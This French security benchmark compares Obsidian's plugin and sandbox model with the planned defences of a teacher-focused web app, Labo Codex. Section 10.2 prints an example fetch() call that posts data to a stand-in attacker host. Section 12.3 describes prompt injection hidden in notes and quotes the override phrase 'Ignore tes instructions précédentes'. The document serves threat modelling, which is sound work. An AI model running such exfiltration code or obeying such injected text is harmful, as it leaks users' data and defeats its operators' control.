# Benchmark Obsidian vs Labo Codex

> **Document autonome** — première version : 6 mai 2026.
>
> **Origine** : Grégoire a partagé un échange avec une autre instance de Claude qui comparait spontanément Labo Codex à Obsidian. Comparaison utile parce qu'Obsidian est un projet analogue à grande échelle (application locale, partage entre utilisateurs, communauté d'utilisateurs techniques) qui a survécu et évolué — ses choix de sécurité méritent d'être étudiés comme références.
>
> **Objectif** : comparer point par point les patterns de sécurité d'Obsidian aux choix faits ou planifiés dans Labo Codex. Identifier les bonnes idées à adopter, les angles morts mutuels, et les divergences justifiées par le contexte différent.
>
> **Méthodologie et sources** : ce document s'appuie sur la documentation officielle Obsidian (consultée le 6 mai 2026), les forums utilisateurs, et les critiques récentes de la communauté sur le modèle de sécurité des greffons. Les références exactes sont en fin de document.
>
> **Limite importante** : je n'ai pas accès au code source d'Obsidian (privé). Les inférences sur leur architecture interne sont marquées comme telles. Pour les décisions engageantes, vérifier directement la documentation Obsidian officielle.

---

## Table des matières

1. [Architectures comparées](#1-architectures-comparées)
2. [Tableau récapitulatif des défenses](#2-tableau-récapitulatif-des-défenses)
3. [Pattern 1 — Format de stockage et protection passive](#3-pattern-1--format-de-stockage-et-protection-passive)
4. [Pattern 2 — Mode restreint par défaut](#4-pattern-2--mode-restreint-par-défaut)
5. [Pattern 3 — Revue humaine des contenus partagés](#5-pattern-3--revue-humaine-des-contenus-partagés)
6. [Pattern 4 — Bac à sable de la plateforme](#6-pattern-4--bac-à-sable-de-la-plateforme)
7. [Pattern 5 — Permissions granulaires (lacune partagée)](#7-pattern-5--permissions-granulaires-lacune-partagée)
8. [Pattern 6 — Modèle de confiance et cercles concentriques](#8-pattern-6--modèle-de-confiance-et-cercles-concentriques)
9. [Le cas FSAPI : un point critique](#9-le-cas-fsapi--un-point-critique)
10. [Points où Labo Codex est plus protecteur qu'Obsidian](#10-points-où-labo-codex-est-plus-protecteur-quobsidian)
11. [Points où Obsidian est plus protecteur que Labo Codex](#11-points-où-obsidian-est-plus-protecteur-que-labo-codex)
12. [Angles morts mutuels](#12-angles-morts-mutuels)
13. [Recommandations issues du benchmark](#13-recommandations-issues-du-benchmark)
14. [Sources](#14-sources)

---

## 1. Architectures comparées

Avant de comparer les défenses, il faut comparer les architectures — parce qu'une défense pertinente pour l'un peut ne pas l'être pour l'autre.

### 1.1 Obsidian

Obsidian se déploie sous plusieurs formes :

- **Desktop** (macOS, Windows, Linux) — application Electron. Electron embarque un moteur Chromium + Node.js. Une fenêtre Electron est essentiellement un navigateur captif avec accès complet au système via Node. **Le sandbox du navigateur est levé** par défaut dans Electron — les greffons et le code de l'app peuvent lire et écrire n'importe où sur le disque, lancer des processus, accéder au réseau sans contrainte CSP stricte.
- **Mobile** (iOS, iPadOS, Android) — applications natives qui respectent les sandboxes des systèmes hôtes. Sur iOS/iPadOS, le sandbox d'Apple est strict (accès limité au périmètre du coffre, pas d'élévation possible). Sur Android, le sandbox est légèrement plus permissif mais reste contenu.

Les données : fichiers `.md` (Markdown) dans un dossier appelé « coffre » (vault). Le coffre est un répertoire visible dans le système de fichiers. Pas de base de données — les notes sont directement des fichiers texte que l'utilisateur peut éditer avec n'importe quel autre outil.

### 1.2 Labo Codex

Labo Codex est une application **web pure** (HTML/CSS/JavaScript vanilla, sans framework). Elle ne se déploie pas sous forme native — elle s'exécute dans le navigateur de l'utilisateur (Safari, Chrome, Edge, Firefox), avec hébergement local ou Netlify.

Les données : stockées dans IndexedDB du navigateur (couche `db.js`), avec compléments via File System Access API (FSAPI) pour les fichiers disque (`travaux-stockage.js`, `reserve.js`) — quand cette API est disponible (voir §9).

### 1.3 Implications de cette différence

| Dimension | Obsidian | Labo Codex |
|---|---|---|
| Type d'app | Native (Electron sur desktop, native sur mobile) | Web pure dans navigateur |
| Sandbox | Faible sur Electron, fort sur iOS | Toujours fort (sandbox du navigateur) |
| Stockage | Fichiers `.md` visibles dans le filesystem | IndexedDB invisible + FSAPI sur certains navigateurs |
| Distribution | App téléchargée et installée | URL servie par un serveur web |
| Extensions | Système de greffons JavaScript actif | Pas d'extensions utilisateur prévues |
| Public | Utilisateurs techniques (notabilité « productivité numérique ») | Enseignants québécois, profils non techniques majoritairement |

Cette différence change la nature des menaces. Obsidian doit défendre contre des greffons tiers exécutant du code. Labo Codex n'a pas ce vecteur direct mais a un équivalent dégradé (contenu importé qui peut être interprété si une faille XSS subsiste).

---

## 2. Tableau récapitulatif des défenses

Vue d'ensemble — chaque ligne est développée dans les sections suivantes.

| Pattern | Obsidian | Labo Codex actuel | Labo Codex planifié | Convergence ? |
|---|---|---|---|---|
| **Format de stockage** | Markdown pur (inerte) | JSON (inerte comme fichier, interprétable si rendu via innerHTML) | Conteneur ZIP signé `.lcz` (`PROTECTION-FICHIERS-EXPORT.md` §7) | Partiel |
| **Mode restreint par défaut** | Restricted Mode activé d'office, greffons désactivés | Pas d'équivalent | Sandbox iframe pour aperçu importé (Défense A de `MODELE-MENACES.md`) | Convergence planifiée |
| **Revue humaine des contenus partagés** | Revue initiale des greffons, pas continue | Aucune | Modération Voûte (Défense L) + signature ECDSA (Défense F) | Convergence planifiée |
| **Bac à sable plateforme** | Faible (Electron desktop), fort (iOS mobile) | Fort sur Safari (Mac + iPad), Chrome/Edge sur Mac | Idem | Labo Codex plus protégé sur Mac |
| **Permissions granulaires** | Aucune (critique communautaire 2025-2026) | Aucune | Cloisonnement modules (Défense D dans doc précédent, angle D non priorisé) | Lacune partagée |
| **Modèle de confiance** | Quatre cercles : utilisateur seul → partage manuel → greffons revus → communauté tierce | Codex individuel + futur Voûte multi-cégep | Voûte avec gouvernance à définir (`SKILL_Securite_donnees.md` §6.2) | À construire |
| **Chiffrement au repos** | Pas par défaut. Chiffrement applicatif via greffon tiers ou FileVault macOS | Aucun | AES-GCM-256 (doc A de la trilogie « Protection des données vivantes ») | **Labo Codex sera plus protecteur** |
| **Versioning et résilience** | Pas par défaut. Greffon tiers ou Time Machine | Manuel via backups USB/iCloud | Snapshots automatiques + journal + externalisation Réserve (doc B) | **Labo Codex sera plus protecteur** |
| **Anonymisation pour partage** | Pas pertinent (pas de partage de données identifiantes) | Aucune | Module d'anonymisation (doc C) | **Labo Codex sera plus complet** |

Trois zones de convergence (formats, modes restreints, revue), trois zones où Labo Codex sera plus protecteur (chiffrement, versioning, anonymisation), une lacune partagée (permissions granulaires).

---

## 3. Pattern 1 — Format de stockage et protection passive

### 3.1 Obsidian

**Choix** : Markdown pur. Chaque note est un fichier `.md` lisible par n'importe quel éditeur de texte.

**Force de la protection passive** : un fichier `.md` ne contient **structurellement** aucun mécanisme d'exécution de code. Aucun moteur de rendu Markdown standard n'exécute de JavaScript à partir du texte source. Tu peux ouvrir un `.md` malveillant dans TextEdit, BBEdit, vim — il s'affiche, rien ne s'exécute.

**Faille connue** : certains greffons Obsidian (Templater, Dataview JS) **transforment** des fragments de notes en code exécutable. Un `.md` qui contient un bloc Dataview JS reste inerte tant que le greffon Dataview n'est pas activé. Activé, le greffon interprète le bloc et exécute le code. La protection passive devient conditionnelle à la configuration utilisateur.

### 3.2 Labo Codex

**Choix actuel** : JSON pour les exports de bibliothèques, JSON dans IndexedDB pour les données vivantes.

**Force de la protection passive** : un fichier `.json` est inerte structurellement, comme un `.md`. TextEdit, BBEdit, n'importe quel éditeur l'affiche sans exécuter.

**Faille connue** : à l'**affichage** dans l'app, les champs textuels du JSON peuvent être injectés via `innerHTML` et interprétés par le navigateur. C'est le scénario I-01 du `MODELE-MENACES.md`. La protection passive est **plus fragile** que pour Markdown, parce que le risque d'exécution dépend d'un seul `innerHTML` mal placé dans le code de l'app — alors que pour Obsidian, le risque dépend de l'activation explicite d'un greffon spécifique.

### 3.3 Comparaison

| Dimension | Markdown (Obsidian) | JSON (Labo Codex) |
|---|---|---|
| Inerte comme fichier | Oui | Oui |
| Inerte au rendu standard | Oui (la plupart des viewers) | **Non** (si rendu via innerHTML) |
| Activation du risque | Greffon explicite installé | Faille code app, plus opaque |
| Audit utilisateur possible | Lire le `.md`, c'est lire le contenu | Lire le `.json`, c'est lire le contenu — mais le risque vient de l'app, pas du contenu seul |

**Verdict** : Markdown a une **propriété structurelle meilleure** que JSON pour la protection passive, parce que le rendu Markdown standard n'exécute pas. Labo Codex compense par les défenses au rendu (`echapperHtml`, sandbox iframe, audit `innerHTML`) — c'est exactement le `MODELE-MENACES.md` §8.

**Recommandation Labo Codex** : continuer le travail entamé (Défense E — migration `innerHTML` → `textContent`). Cette défense est ce qui rapproche Labo Codex de la propriété structurelle de Markdown.

---

## 4. Pattern 2 — Mode restreint par défaut

### 4.1 Obsidian

**Choix** : à l'installation, Obsidian active **Restricted Mode** (anciennement appelé Safe Mode). Conséquences :

- Les greffons communautaires sont **désactivés** par défaut.
- Pour activer un greffon, l'utilisateur doit explicitement (1) désactiver Restricted Mode, (2) installer le greffon depuis le marketplace, (3) l'activer manuellement.
- Avant désactivation de Restricted Mode, Obsidian affiche un avertissement clair sur les risques.

C'est l'application du principe **« sécurisé par défaut »**. La friction est intentionnelle — chaque ajout de capacité externe nécessite un acte conscient de l'utilisateur.

**Effet pratique** : un coffre reçu d'un tiers ne fait rien tant que l'utilisateur n'active pas explicitement les greffons. Même si le coffre contenait un greffon malveillant.

### 4.2 Labo Codex actuel

**Choix actuel** : pas d'équivalent. À l'import d'une grille ou d'un pack, le contenu est immédiatement disponible dans la bibliothèque et peut être affiché par les modules de rendu. Aucune étape intermédiaire « activation explicite ».

**Conséquence** : un payload caché dans une grille importée s'active au premier rendu (cf. D-01).

### 4.3 Labo Codex planifié

**Défense A du `MODELE-MENACES.md`** : sandbox iframe pour aperçu des grilles importées. Avant qu'une grille touche le contexte principal de l'app, son aperçu se fait dans un iframe isolé sans accès à l'IndexedDB ou aux handles FSAPI. L'utilisateur doit explicitement valider l'usage de la grille pour qu'elle quitte le sandbox.

C'est l'**équivalent fonctionnel** du Restricted Mode d'Obsidian, mais appliqué grille-par-grille au lieu de globalement.

### 4.4 Comparaison

| Dimension | Obsidian Restricted Mode | Labo Codex sandbox iframe (planifié) |
|---|---|---|
| Granularité | Globale (tous les greffons) | Par grille importée |
| Friction | Une fois par installation du coffre | À chaque import |
| Visibilité utilisateur | Bannière explicite | Dialogue d'aperçu |
| Robustesse | Code des greffons ne s'exécute pas tant que désactivé | Code des grilles s'exécute dans le sandbox, mais sans capacité de nuire |

**Verdict** : Obsidian a une approche **plus binaire et radicale** (tout est désactivé). Labo Codex planifie une approche **plus granulaire** (chaque grille est sandboxée individuellement). Les deux peuvent être efficaces. Labo Codex a l'avantage d'être moins frustrant à l'usage (pas besoin de désactiver Restricted Mode pour utiliser une seule grille de confiance).

**Recommandation** : maintenir le plan de la Défense A. Considérer aussi un **mode restreint global** activable dans les préférences, pour les utilisateurs paranoïaques (« je veux que toute grille importée passe par le sandbox, même celles que je crois sûres »).

---

## 5. Pattern 3 — Revue humaine des contenus partagés

### 5.1 Obsidian

**Choix** : revue manuelle initiale des greffons soumis au marketplace officiel. L'équipe Obsidian (ou des modérateurs désignés) examine le greffon avant publication.

**Limite documentée** : la revue initiale **n'est pas un audit de code exhaustif**. Elle vérifie principalement :
- Conformité aux politiques du développeur (pas de tracking, pas de paywall caché, fonctionnalité documentée).
- Comportement attendu (le greffon fait ce qu'il prétend faire).

**Limite plus problématique** : les **mises à jour** des greffons ne sont **pas reviewées** de la même manière. Une fois publié, un greffon peut être mis à jour par son développeur et la nouvelle version est distribuée aux utilisateurs sans nouvelle revue exhaustive. C'est le vecteur d'attaque supply-chain classique : un greffon bénin à la publication devient malveillant via une mise à jour.

**Critique communautaire (2025-2026)** : la communauté Obsidian a publiquement débattu cette limite. Une partie des utilisateurs réclame un système de permissions plus strict (manifeste de permissions à la mode des extensions de navigateur). L'équipe Obsidian a reconnu la limite mais n'a pas encore implémenté de solution structurelle.

### 5.2 Labo Codex actuel

**Choix actuel** : aucune revue, aucune modération. La Voûte n'est pas encore en production. Le partage actuel est informel (envoi de ZIP par courriel ou Discord).

### 5.3 Labo Codex planifié

**Défense L du `MODELE-MENACES.md`** : modération humaine pour les dépôts publics dans la Voûte. Tout dépôt passe par une étape de validation avant d'être accessible aux autres enseignants. La spécification est partielle dans le `SKILL_Securite_donnees.md` §6.2 (six questions ouvertes sur la gouvernance).

**Défense F** : signature ECDSA des contenus partagés. Authentification de l'auteur. Couplée à un annuaire de clés publiques.

### 5.4 Comparaison

| Dimension | Obsidian | Labo Codex planifié |
|---|---|---|
| Revue initiale | Oui, par équipe officielle | Oui (modération humaine prévue) |
| Revue des mises à jour | Non (critique 2025-2026) | À définir — opportunité d'apprendre du raté d'Obsidian |
| Signature cryptographique | Non | Oui (Défense F) |
| Annuaire de clés | Non | À concevoir |
| Kill list / révocation | Non | Oui (Défense G) |

**Verdict** : Labo Codex **planifie un dispositif plus robuste** qu'Obsidian sur ce pattern, parce qu'il intègre la critique communautaire récente d'Obsidian. C'est un avantage qu'il faut concrétiser plutôt que laisser glisser.

**Recommandation forte** : la signature ECDSA (Défense F) doit s'appliquer aussi aux **mises à jour** d'une grille déjà publiée. Pas seulement à la première publication. Cela évite l'angle mort principal d'Obsidian.

---

## 6. Pattern 4 — Bac à sable de la plateforme

### 6.1 Obsidian Desktop (Electron)

**Caractéristique** : faible bac à sable. Electron est essentiellement un navigateur captif + Node.js + accès filesystem complet. Un greffon a accès à `require('fs')`, `require('child_process')`, et toutes les APIs Node. Il peut donc :

- Lire et écrire n'importe quel fichier accessible à l'utilisateur (pas seulement le coffre).
- Lancer des processus système.
- Faire des requêtes réseau sans contrainte CSP.
- Persister son état entre sessions.

**Position de l'équipe Obsidian** : ils ont fait le choix d'assumer ce modèle pour offrir la richesse des greffons. Ils compensent par la revue initiale (§5) et le mode restreint par défaut (§4).

### 6.2 Obsidian Mobile (iOS, iPadOS, Android)

**Caractéristique** : bac à sable strict imposé par la plateforme. Sur iOS/iPadOS, Obsidian Mobile **n'a pas** accès au filesystem hors de son périmètre. Les greffons héritent de cette contrainte. Un greffon malveillant sur iPad ne peut pas atteindre tes photos, tes documents, ou les données d'autres apps.

**Conséquence** : Obsidian Mobile est **structurellement plus sûr** qu'Obsidian Desktop. Pas grâce à une décision d'Obsidian, mais grâce à la plateforme Apple.

### 6.3 Labo Codex (Safari + Chrome/Edge)

**Caractéristique** : Labo Codex tourne dans le sandbox du navigateur, qui est strict par construction :

- Pas d'accès au filesystem hors des APIs explicites (File System Access API, et seulement si supportée et autorisée par l'utilisateur).
- CSP active (`default-src 'self'; script-src 'self'` actuellement).
- Pas d'accès aux autres apps ni au système.
- Isolation par origine.

**Comparaison avec Obsidian Mobile** : équivalence approximative. Le sandbox du navigateur est analogue au sandbox iOS dans l'esprit (isolation forte) mais avec des APIs différentes (Web APIs vs UIKit).

**Comparaison avec Obsidian Desktop** : Labo Codex est **significativement plus sûr** par construction. Là où Obsidian Desktop laisse un greffon accéder au filesystem complet, Labo Codex contraint à passer par les APIs Web et requiert l'autorisation utilisateur explicite (pour FSAPI quand disponible).

### 6.4 Verdict

Labo Codex bénéficie d'**un meilleur sandbox structurel** qu'Obsidian Desktop, équivalent à Obsidian Mobile. C'est un avantage **gratuit** — pas le résultat d'une décision active, juste un effet de l'architecture web. À conserver et ne pas dégrader.

**Risque à surveiller** : si un jour Labo Codex est wrappé en application desktop (Electron, Tauri, ou équivalent) pour distribution Mac App Store ou autre, ce sandbox structurel disparaît. Décision à prendre en connaissance de cause si ce chemin est envisagé.

---

## 7. Pattern 5 — Permissions granulaires (lacune partagée)

### 7.1 La critique 2025-2026 d'Obsidian

La communauté Obsidian a publiquement critiqué l'absence de **système de permissions granulaires** pour les greffons. Aujourd'hui, c'est tout ou rien — un greffon activé a accès à tout. La demande communautaire : un manifeste où chaque greffon déclare en amont les permissions nécessaires (« lecture du coffre », « accès réseau », « accès filesystem hors coffre », « exécution de processus »), avec consentement utilisateur granulaire.

C'est le modèle des **extensions de navigateur** (Chrome, Firefox) et de **macOS/iOS** depuis quelques versions (TCC — Transparency, Consent and Control).

### 7.2 Labo Codex actuel

Aucune extension utilisateur prévue. Mais les **modules internes** de l'app ont eux aussi accès à tout. Un payload XSS exploitant une faille `innerHTML` peut lire toute la base IndexedDB et tous les handles FSAPI persistés. C'est ce qui rend possible D-01 et X-01.

### 7.3 Possibilité — cloisonnement modules

Dans nos échanges précédents (réponse à la question « comment protéger les micro-data »), j'ai listé quatre angles dont **D — Cloisonnement modules (contrôle d'accès interne)**. Tu m'as répondu que ce n'était pas une priorité immédiate compte tenu de l'effort.

Le benchmark Obsidian confirme : c'est une **lacune partagée** entre Obsidian et Labo Codex. Aucun des deux ne le fait. C'est un chantier de refonte architecturale lourd. Probablement pas le bon investissement à court terme — mais à considérer si Labo Codex devient un produit grand public exposé à plus d'attaques.

**Recommandation** : ne pas prioriser maintenant. À documenter comme angle long terme dans la roadmap sécurité.

---

## 8. Pattern 6 — Modèle de confiance et cercles concentriques

### 8.1 Obsidian

Quatre cercles de confiance, du plus interne au plus externe :

1. **Utilisateur seul** — son propre coffre, ses propres notes. Aucun risque tiers.
2. **Partage manuel** — il reçoit un `.md` ou un coffre d'un collègue connu, qu'il importe.
3. **Greffons du marketplace officiel** — installés depuis le store, revus initialement. Confiance dans l'équipe Obsidian + dans la revue.
4. **Greffons tiers BRAT ou installation manuelle** — installés depuis un dépôt GitHub directement, hors marketplace. Confiance dans le développeur seul.

Chaque cercle a un niveau de friction et de risque différent. L'utilisateur navigue consciemment entre les cercles.

### 8.2 Labo Codex actuel

Trois cercles implicites :

1. **Codex personnel** — saisie directe par l'enseignant. Confiance totale.
2. **Partage informel** — ZIP de bibliothèque échangé entre collègues (par courriel, Discord). Confiance dans le collègue.
3. **Voûte future** — pas encore en production. Modèle de confiance à définir.

### 8.3 Labo Codex planifié

Le `SKILL_Securite_donnees.md` §6.2 liste six questions ouvertes sur la gouvernance Voûte. Une fois ces questions tranchées, le modèle de confiance prendra forme. Probablement :

1. **Codex personnel** — comme aujourd'hui.
2. **Partage direct** — entre enseignants identifiés, avec signature ECDSA.
3. **Voûte publique avec modération** — dépôts revus par un comité (cf. Défense L).
4. **Dépôts non modérés** — option avancée pour utilisateurs avertis (équivalent BRAT d'Obsidian).

### 8.4 Verdict

Obsidian a un modèle de confiance **mature et bien internalisé** par sa communauté. Labo Codex a un modèle implicite, à formaliser.

**Recommandation** : documenter explicitement les cercles de confiance de Labo Codex dans un futur document (`docs/securite/MODELE-CONFIANCE.md` ?), surtout avant l'ouverture de la Voûte. Les utilisateurs ont besoin de comprendre quels cercles ils traversent.

---

## 9. Le cas FSAPI : un point critique

### 9.1 Le fait

Mes recherches confirment que **Safari ne supporte pas la File System Access API**, ni sur macOS ni sur iPadOS/iOS. `showDirectoryPicker()` n'existe pas dans Safari. Apple ne s'est pas engagé à l'implémenter. Seul l'Origin Private File System (OPFS) est disponible dans Safari.

### 9.2 Implications pour Labo Codex

Les modules `travaux-stockage.js`, `reserve.js`, `codex.js`, `codex-data.js`, `reserve-ouvrir.js` utilisent activement la FSAPI (`showDirectoryPicker`, `getDirectoryHandle`, `createWritable`, `removeEntry`).

Conséquences :

- **Sur ton iPad Air M1 (iPadOS 18.5, Safari)** : ces fonctionnalités **ne marchent pas**. Soit elles affichent un message d'erreur, soit Labo Codex a un fallback (à vérifier dans le code).
- **Sur ton MacBook M3 (Sequoia 15.5, Safari)** : idem — pas de FSAPI.
- **Sur Chrome ou Edge** (sur Mac) : FSAPI disponible.

### 9.3 Conséquences pour le modèle de menaces

Le scénario D-03 du `MODELE-MENACES.md` (Effacement disque ciblé via FSAPI rémanent) **ne s'applique pas** aux utilisateurs Safari. Le vecteur d'attaque n'existe que sur Chrome/Edge.

Cela change la priorité de la Défense D (révocation FSAPI) — moins urgente si la majorité des utilisateurs Labo Codex sont sur Safari. À recalibrer.

### 9.4 Question critique pour Grégoire

**Sur quel navigateur testes-tu Labo Codex aujourd'hui ?**

- Si **Safari (Mac + iPad)** : la FSAPI ne fonctionne pas. Les fonctionnalités Réserve sur disque et Travaux sur disque sont en mode dégradé (peut-être inopérantes). À vérifier par test.
- Si **Chrome/Edge sur Mac + Safari sur iPad** : tu as un fonctionnement asymétrique. FSAPI sur Mac, pas sur iPad. À documenter pour les utilisateurs.

C'est une question à clarifier en priorité, parce qu'elle affecte plusieurs documents de sécurité produits.

### 9.5 Comparaison avec Obsidian

Obsidian, étant une application native, **ne dépend pas** de la FSAPI. Sur iPad, il utilise les APIs natives de stockage iOS (Files app, iCloud Drive). Sur Mac Electron, il utilise Node `fs`. Il n'a pas le problème de compatibilité Safari.

Labo Codex, en tant qu'app web, est tributaire des choix d'Apple sur Safari. C'est une **contrainte structurelle** qu'aucune décision Labo Codex ne peut lever, sauf à abandonner Safari ou à implémenter des fallbacks (par exemple : stockage uniquement dans IndexedDB, sans dossier disque).

---

## 10. Points où Labo Codex est plus protecteur qu'Obsidian

### 10.1 Pas d'exécution arbitraire native

Obsidian Desktop laisse les greffons exécuter du JavaScript Node avec accès filesystem complet. Labo Codex n'a pas d'équivalent — pas de système d'extensions utilisateur, donc pas de point d'entrée pour du code arbitraire (sauf XSS, qui est plus contraint par le sandbox du navigateur).

### 10.2 CSP restrictive native

La CSP de Labo Codex (`default-src 'self'; script-src 'self'; ...`) bloque les requêtes réseau externes, l'exécution de scripts inline directs, et plusieurs autres vecteurs. Obsidian Desktop, en environnement Electron, n'a pas cette protection — un greffon malveillant peut faire `fetch('https://attaquant.com', { method: 'POST', body: donnees })` sans contrainte.

### 10.3 Chiffrement au repos planifié

Obsidian ne chiffre pas les notes en local par défaut. Les `.md` sont en clair dans le coffre. Pour chiffrer, l'utilisateur doit installer un greffon tiers (qui lui-même a accès à tout, voir §7).

Labo Codex planifie un chiffrement applicatif (doc A de la trilogie). Si implémenté, Labo Codex sera **plus protecteur** qu'Obsidian sur cet axe.

### 10.4 Versioning et résilience planifiés

Obsidian ne fait pas de versioning automatique des notes. Si une note est modifiée par erreur, c'est perdu sauf Time Machine ou greffon tiers.

Labo Codex planifie un système de versioning (doc B). Sera plus protecteur si implémenté.

### 10.5 Anonymisation native

Obsidian n'a pas d'usage de partage de données identifiantes (les notes sont du contenu personnel, pas des données structurées sur des tiers). Donc pas de besoin d'anonymisation.

Labo Codex a un besoin spécifique (Loi 25, recherche pédagogique) et planifie un module d'anonymisation (doc C). Pas un avantage comparatif au sens strict, mais une fonctionnalité absente d'Obsidian que Labo Codex aborde correctement.

---

## 11. Points où Obsidian est plus protecteur que Labo Codex

### 11.1 Format de stockage structurellement inerte

Markdown ne s'exécute pas au rendu standard. JSON peut être interprété comme HTML si mal rendu. Avantage Obsidian sur ce point, partiellement compensé par les défenses Labo Codex planifiées.

### 11.2 Mode restreint global par défaut

Obsidian active Restricted Mode dès l'installation. Labo Codex n'a pas d'équivalent global (la sandbox iframe planifiée est par-grille, pas globale). Avantage Obsidian sur l'approche binaire.

**Possibilité d'amélioration Labo Codex** : ajouter une préférence globale « Mode strict » qui force tous les imports à passer par le sandbox, sans dérogation possible.

### 11.3 Communauté mature et critique externe

Obsidian a une communauté large d'utilisateurs techniques qui scrutent l'écosystème, signalent les greffons suspects, publient des audits. Labo Codex a une communauté embryonnaire (toi + premiers testeurs).

C'est un avantage qui se construit dans le temps. Pas d'action court terme possible — mais à valoriser à mesure que la communauté grandit.

### 11.4 Distribution contrôlée des extensions

Obsidian distribue les greffons via son marketplace officiel, avec revue initiale. Labo Codex ne distribue rien (pas de Voûte en production). Avantage Obsidian temporaire, à effacer quand la Voûte sera en service avec sa modération.

---

## 12. Angles morts mutuels

Points qui ne sont bien couverts ni par Obsidian ni par Labo Codex.

### 12.1 Permissions granulaires

Voir §7. Critique communautaire récente d'Obsidian. Labo Codex a la même lacune (cloisonnement modules absent). Aucun des deux n'a de système de manifest de permissions.

### 12.2 Mises à jour de contenus partagés

Obsidian ne reviewe pas les mises à jour de greffons après publication initiale. Labo Codex devra décider comment traiter les mises à jour de grilles signées (re-signer obligatoirement ? Permettre une migration silencieuse ?). Question ouverte.

### 12.3 Prompt injection vers IAs

Vecteur émergent que ni Obsidian ni Labo Codex ne couvrent. Une note Markdown peut contenir des instructions cachées qui manipulent un LLM analysant la note (« Ignore tes instructions précédentes »). Pareil pour un JSON Labo Codex.

Évoqué dans le `PROTECTION-FICHIERS-EXPORT.md` §2 (cas particuliers). Pas de défense intégrée à ce jour dans aucun des deux. Vecteur à surveiller.

### 12.4 Compromis vol de la machine

Si le Mac est volé avec une session ouverte, ni Obsidian ni Labo Codex ne protègent. FileVault de macOS est le filet de sécurité, indépendant de l'app.

---

## 13. Recommandations issues du benchmark

### 13.1 À adopter ou consolider

**R1 — Mode strict global, en complément du sandbox iframe par-grille.** Ajouter dans les préférences Labo Codex une option « Mode strict » qui force tous les imports à passer par le sandbox. Inspiration directe d'Obsidian Restricted Mode. Effort estimé : 1-2 jours après que la Défense A soit implémentée.

**R2 — Documentation explicite des cercles de confiance.** Créer un futur `docs/securite/MODELE-CONFIANCE.md` qui formalise les niveaux de confiance et les frictions associées (cf. §8). Aide les utilisateurs à comprendre où ils naviguent. Effort : 1 jour.

**R3 — Signature des mises à jour, pas seulement des premières publications.** Quand la Défense F (signature ECDSA) sera implémentée, s'assurer qu'elle s'applique aussi aux mises à jour. Apprendre du raté d'Obsidian (revue initiale uniquement). À intégrer dans la spec.

**R4 — Manifest de permissions pour les futures extensions.** Si Labo Codex envisage un jour un système de greffons utilisateur (à éviter probablement, mais à clarifier), prévoir dès la conception un système de manifest de permissions (« ce greffon lit la bibliothèque », « ce greffon accède au réseau »). Apprendre de la critique communautaire d'Obsidian.

### 13.2 À ne pas reproduire d'Obsidian

**R5 — Ne pas wrapper Labo Codex en Electron sans réflexion sécurité.** Si tu envisageais un jour une version desktop native, le passage par Electron dégraderait significativement le sandbox actuel. Alternatives à étudier : Tauri (sandbox plus strict que Electron), PWA installable (garde le sandbox navigateur), application web déployée sans wrapper.

**R6 — Ne pas relâcher la CSP pour faciliter le développement.** Obsidian Electron est permissif par construction. La CSP de Labo Codex est un avantage à préserver, même si elle complique parfois l'intégration de fonctionnalités tierces (Chart.js, JSZip). Toute exception doit être justifiée et minimale.

### 13.3 Question à clarifier en priorité

**Q — Quel navigateur cible pour Labo Codex ?**

Cette question découle de §9. Trois options :

- **Safari only** (Mac + iPad) — sandbox structurel solide, mais pas de FSAPI. Les fonctionnalités Réserve disque et Travaux disque doivent fonctionner sans FSAPI (fallback à coder).
- **Chrome/Edge sur Mac uniquement** — FSAPI disponible, sandbox moins documenté mais probablement équivalent. iPad reste sur Safari (FSAPI absent, fallback nécessaire).
- **Multi-navigateurs avec fonctionnalités asymétriques** — Mac Chrome/Edge a tout, Mac Safari et iPad Safari ont une expérience dégradée. À documenter pour les utilisateurs.

Ma préférence : **option 1 (Safari only)** parce que c'est la plus cohérente avec ton workflow actuel et le sandbox le plus strict. Implique un travail de fallback pour les fonctionnalités FSAPI — stocker les blobs dans IndexedDB plutôt que via FSAPI, par exemple. Effort modéré.

### 13.4 Synthèse opérationnelle

Le benchmark confirme la pertinence des défenses planifiées dans le `MODELE-MENACES.md`. Quatre ajouts mineurs (R1, R2, R3, R4) à intégrer. Une décision majeure à clarifier (Q sur le navigateur cible). Aucun renversement de stratégie nécessaire — la trajectoire est saine.

---

## 14. Sources

### 14.1 Documentation officielle Obsidian

- [Plugin security - Obsidian Help](https://help.obsidian.md/plugin-security) — Documentation officielle sur la sécurité des greffons.
- [Community plugins - Obsidian](https://mintlify.wiki/obsidianmd/obsidian-help/extending/community-plugins) — Page de documentation des greffons communautaires.

### 14.2 Forums et discussions communautaires

- [How Concerned Should One Be About Security When Using Community Plugins?](https://forum.obsidian.md/t/how-concerned-should-one-be-about-security-when-using-community-plugins/89829) — Discussion forum Obsidian sur les inquiétudes sécurité.
- [Community Plugin - Security Hint and Quality Gate](https://forum.obsidian.md/t/community-plugin-security-hint-and-quality-gate/26227) — Proposition communautaire d'amélioration sécurité.
- [Security of the plugins](https://forum.obsidian.md/t/security-of-the-plugins/7544) — Discussion ancienne sur le modèle de sécurité.

### 14.3 Critiques et analyses récentes

- [Obsidian's Plugin Security Model Faces Community Criticism Despite Supply Chain Protection Claims - BigGo News](https://biggo.com/news/202509200713_Obsidian_Plugin_Security_Concerns) — Article 2025 sur les critiques communautaires.
- [Is Obsidian Really Private? The Ultimate 2026 Data Security Guide](https://techradar.info/is-obsidian-really-private-the-ultimate-2026-data-security-guide/) — Guide récent sur la confidentialité Obsidian.
- [The 2026 Obsidian Report Card](https://practicalpkm.com/2026-obsidian-report-card/) — Analyse de l'année 2026 sur Obsidian.

### 14.4 Support technique des APIs web

- [File System Access API | Can I use](https://caniuse.com/native-filesystem-api) — Tableau de support navigateurs pour FSAPI.
- [File System Access API: Browser Support, Methods, Limits | TestMu AI](https://www.testmuai.com/learning-hub/file-system-access-api-browser-support/) — Détail des supports navigateurs.
- [File System API - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/File_System_API) — Documentation MDN officielle.

### 14.5 Documents internes Labo Codex référencés

- `docs/securite/MODELE-MENACES.md` — Modèle de menaces complet, 14 scénarios.
- `docs/securite/PROTECTION-FICHIERS-EXPORT.md` — Protection des fichiers d'export.
- `docs/securite/PROTECTION-DONNEES-CHIFFREMENT-REPOS.md` — Document A trilogie données vivantes.
- `docs/securite/PROTECTION-DONNEES-VERSIONING-RESILIENCE.md` — Document B trilogie.
- `docs/securite/PROTECTION-DONNEES-ANONYMISATION.md` — Document C trilogie.
- `Skills pour Claude Code/SKILL_Securite_donnees.md` — Skill sécurité, §6.2 questions gouvernance Voûte.

---

## Historique

| Date | Version | Changement |
|---|---|---|
